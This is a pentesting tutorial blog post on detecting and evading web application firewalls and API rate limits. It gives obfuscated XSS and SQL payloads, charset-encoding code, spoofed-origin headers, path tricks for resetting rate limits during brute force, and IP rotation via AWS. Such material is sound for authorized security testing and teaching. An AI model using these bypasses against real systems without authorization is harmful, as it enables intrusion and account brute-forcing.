---
title: "Bypassing WAFs"
date: 2023-08-05T00:15:21+01:00
draft: false
summary: Have you ever been blocked by a webserver that you are performing pentesting on ? Check out the best techniques used Bypass WAFs and perform your Bug Hunting/ Pentesting without obstacles !
tags: ["Web Hacking","API Hacking", "Bug Bounty"]
---

## I - Toolkits

- `nmap`  http-waf-detect
- `wafw00f`
- `ffuf`
- `wfuzz`
- `IP Rotate` Burp Extension
## II - Detecting WAF

We get detected by :
*IP address*, *origin* **headers**, *authorization tokens*, and *metadata*. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.

> Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended. That way, you should have a chance to understand the app’s functionality before getting into trouble. You could, for example, review documentation or build out a collection of valid requests and then map out the API as a valid user.

- A *302* *response* that forwards you to a CDN
- Using *nmap* 
```shell
nmap -p 80 –script http-waf-detect http://hapihacker.com
```

- Using *Wafw00f*
```shell
wafw00f [target]
```

- Paying attention to *headers* such as *X-CDN*,*CDNs* provide a way to reduce latency globally by caching the API pro-
vider’s requests. ,  CDNs will often provide WAFs as a service
**X-CDN**: akamai
**X-CDN**: Incapsula
**X-Kong-Proxy-Latency**: 123
**Server**: Zenedge
...

## III - Evasing WAF 

###  1 -  Null Bytes
- Could terminate the API security control filters that may be in place.

- If the null byte is processed by a backend program thatvalidates user input, that validation program could be bypassed because itstops processing the input.

string terminators you can use
```
%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e

````

Can be placed in **different parts** of the request to attempt to bypass any restrictions in place,

```xml
{
"uname": "<s%00cript>alert(1);</s%00cript>"
"email": "hapi@hacker.com"
}

<--! We can even use it more than once on the same place : >

{
"uname": "<s%000000cript>alert(1);</s%000000cript>"
"email": "hapi@hacker.com"
}
```

Wordlist
```json
~/tools/SecLists-2023.2Fuzzing/Metacharacters.fuzzdb.txt
```

### 2 - Case Switching 

```json
<sCriPt>alert('supervuln')</scrIpT>
SeLeCT * RoM all_tables
sELecT @@vErSion
```
### 3 -  Encoding 

When encoding, focus on the characters that may be blocked, such as
these:
```json
< > ( ) [ ] { } ; ' / \ |
```

You could either encode part of a payload or encode all

```json
%3cscript%3ealert %28%27supervuln%27%28%3c%2fscript %3e
%3c%73%63%72%69%70%74%3ealert('supervuln')%3c%2f%73%63%72%69%70%74%3e
```

#### 1.1 - Charset Encoding

This technique involves modifying the `Content-Type` header to use a different charset (e.g. `ibm500`). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python

```python
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037"))) 

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```

### 4 - Automation w/*Burp Intruder* & *Wfuzz*

-  *Intruder* -> *Payloads*, **Payload Processing Option** allows you to add rules that Burp will apply to each payload before it is sent.

- Let's say we can bypass WAF by The following rule , we can apply it then start fuzzing for passwords or whatso

- Rules are applied from **TOP** to **BOTTOM** , in this example , suffix and prefix are added after encoding so they are not encoded.
![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_004051.png)

- `Wfuzz` [Usage](https://wfuzz.readthedocs.io/en/latest/user/advanced.html#iterators-combining-payloads)

- List encoding methods:
```js
wfuzz -e encoders
```

- Encode payload before it's sent
```js
wfuzz -z file,wordlist/general/common.txt,md5 http://testphp.vulnweb.com/FUZZ
```
- Multiple Encoders
```js
wfuzz -z list,1-2-3,md5-sha1-none http://webscantest.com/FUZZ
```

### 5 - Using IP Address instead of the domain

Sometimes there could be some some *Subdomains* and/or *endpoints* that are protected by WAF : 

![image](https://flowhero.github.io/assets/images/shemas/2023_08_03_110036.png)

A very common way to bypass this is by using the IP Address instead of the domain , we can get the IP by using `Shodan` extension

![image](https://flowhero.github.io/assets/images/shemas/2023_08_03_110452.png)

But this IP is provided by a CDN (Cloudflare in this example), so it's used by more that one host. Thus, we need to test all active ports until we find which one maps to the website we are testing.

Scenarios :

```bash
curl target.com/  => Forbidden 403
curl ip:port      => Success 200

curl target.com/  => Success 200
curl target.com/protected/endpoint  => Forbidden 403
curl ip:port/protected/endpoint  => Success 200
```

CDNs **sometimes** blocks access by IP Address to protect from this bypass technique

![image](https://flowhero.github.io/assets/images/shemas/2023_08_03_111118.png)
### 6 - Rate Limits Testing

- API providers may include its rate limiting details publicly on its website or in API documentation. 
- Check Headers
```js
x-rate-limit:
x-rate-limit-remaining:
```
- Other APIs won't have an indication but once you exceed the limit you receive `429 Too Many Requests`
- `Retry-After:` Indicates when you can submit additional requests.

- *How to test Rate Limiting ?*
- [ ] avoid being rate limited altogether
- [ ] bypass the mechanism that is blocking you once you are rate limited (Blocked because of IP ? Auth Token ?)


#### 6.1 - Lax Rate Limits

Let's say `Rate limit  = 15 000 Request/min`

*-t* option allows you to specify the concurrent **number of connections**, 
*-s* option allows you to specify a **time delay** between requests.

![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_010914.png)


This will send `12 000 Request/min`
```shell
wfuzz -s 0.0005
```

Or use Burp *Intruder*/*Ressource Pool*

|                                            |     |
| ------------------------------------------ | --- |
| ![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_011645.png) | ![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_011508.png)    |

#### 6.2 - Path Bypass

- If you reach the rate limit, try *Null Bytes* , *Case* &  *Meaningless Parameters* at the end , this could :
	  Restart the rate limit
	  Bypass Rate limiting

```js
POST /api/myprofile%00
POST /api/myprofile%20
POST /api/myProfile
POST /api/MyProfile
POST /api/my-profile

POST /api/myprofile?test=1
```

If meaningless Parameters are restarting rate limiting just change parameter value in every request :

```js
POST /api/myprofile?test=§1§
```

Set the attack type to *pitchfork* and use the same value for both payload positions.
This tactic allows you to use the smallest number of requests required to brute-force the **uid**.

#### 6.3 - Origin Header Spoofing 

Add these headers **one by one** (If you include all headers at once, you may
receive a 431 Request Header Fields Too Large status code)
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

Sometimes, **User-Agent** header will be used in combination with other headers to help identify and block an attacker. 

Use `SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt` to cycle trough user-agents

```ad-done
title: Bypassed 
You’ll know you’ve succeeded if an `x-rate-limit` header **resets** or if you’re able to make successful requests after being blocked.

```


#### 6.4 - Rotating IP Addresses in Burp Suite

If WAF Blocks IP, Use *IP Rotate* **Burp Extension**

![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_122633.png)

- Install *boto3*

```python
pip3 install boto3
```

- Install *Jython* for BurpSuite
- Install *IP Rotate*

- *Add User* in aws -> IAM
![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_123117.png)

![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_123340.png)


![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_123417.png)


Create User

![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_123526.png)

Download *CSV file* containing your user’s **access key** and **secret access key**.

In Burp :

![image](https://flowhero.github.io/assets/images/shemas/2023_08_01_124007.png)

*Save Keys* => *Enable* 

Now, security controls that block you based solely on your IP address
will stand no chance.


